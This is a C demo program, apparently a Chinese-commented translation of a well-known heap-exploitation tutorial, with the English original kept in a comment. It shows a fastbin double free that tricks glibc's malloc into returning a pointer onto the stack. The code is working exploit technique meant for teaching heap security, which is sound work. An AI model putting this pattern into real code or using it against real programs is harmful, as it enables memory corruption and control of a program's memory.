#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "这个demo拓展了fastbin_dup.c,我们在本例中欺骗malloc返回一个指向受我们所控制的地方的指针(在本例中,就是返回到栈上).\n");

	unsigned long long stack_var;

	fprintf(stderr, "我们想要malloc()给我们返回的地址是 %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "分配三个buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "现在释放第一个chunk...\n");
	free(a);

	fprintf(stderr, "如果我们再free %p 一次, 程序就会 crash ,因为此时 %p 在 free list 的顶部.\n", a, a);
	// free(a);

	fprintf(stderr, "所以,作为代替,我们释放chunk2 %p.\n", b);
	free(b);

	fprintf(stderr, "现在我们再free %p 一次, 此时他已经不在free list的顶部了.\n", a);
	free(a);

	fprintf(stderr, "现在 free list 是 [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "现在的free list: [ %p ].\n", a);
	fprintf(stderr, "现在的chunk a %p 是free list的头chunk了.\n"
		"现在我们把一个假的free size写到栈上(本例中是0x20),\n"
		"这个时候ptmalloc就会认为栈上有一个free的chunk,\n"
		"就会把指针返回给他了.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "现在我们把栈指针 %p 的向前八个字节写成0x20\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, 现在将栈指针放到我们的free-list上\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}

/*
#include <stdio.h>
#include <stdlib.h>

int main()
{
	fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc into\n"
	       "returning a pointer to a controlled location (in this case, the stack).\n");

	unsigned long long stack_var;

	fprintf(stderr, "The address we want malloc() to return is %p.\n", 8+(char *)&stack_var);

	fprintf(stderr, "Allocating 3 buffers.\n");
	int *a = malloc(8);
	int *b = malloc(8);
	int *c = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", a);
	fprintf(stderr, "2nd malloc(8): %p\n", b);
	fprintf(stderr, "3rd malloc(8): %p\n", c);

	fprintf(stderr, "Freeing the first one...\n");
	free(a);

	fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
	// free(a);

	fprintf(stderr, "So, instead, we'll free %p.\n", b);
	free(b);

	fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.\n", a);
	free(a);

	fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
		"We'll now carry out our attack by modifying data at %p.\n", a, b, a, a);
	unsigned long long *d = malloc(8);

	fprintf(stderr, "1st malloc(8): %p\n", d);
	fprintf(stderr, "2nd malloc(8): %p\n", malloc(8));
	fprintf(stderr, "Now the free list has [ %p ].\n", a);
	fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.\n"
		"so now we are writing a fake free size (in this case, 0x20) to the stack,\n"
		"so that malloc will think there is a free chunk there and agree to\n"
		"return a pointer to it.\n", a);
	stack_var = 0x20;

	fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\n", a);
	*d = (unsigned long long) (((char*)&stack_var) - sizeof(d));

	fprintf(stderr, "3rd malloc(8): %p, putting the stack address on the free list\n", malloc(8));
	fprintf(stderr, "4th malloc(8): %p\n", malloc(8));
}
*/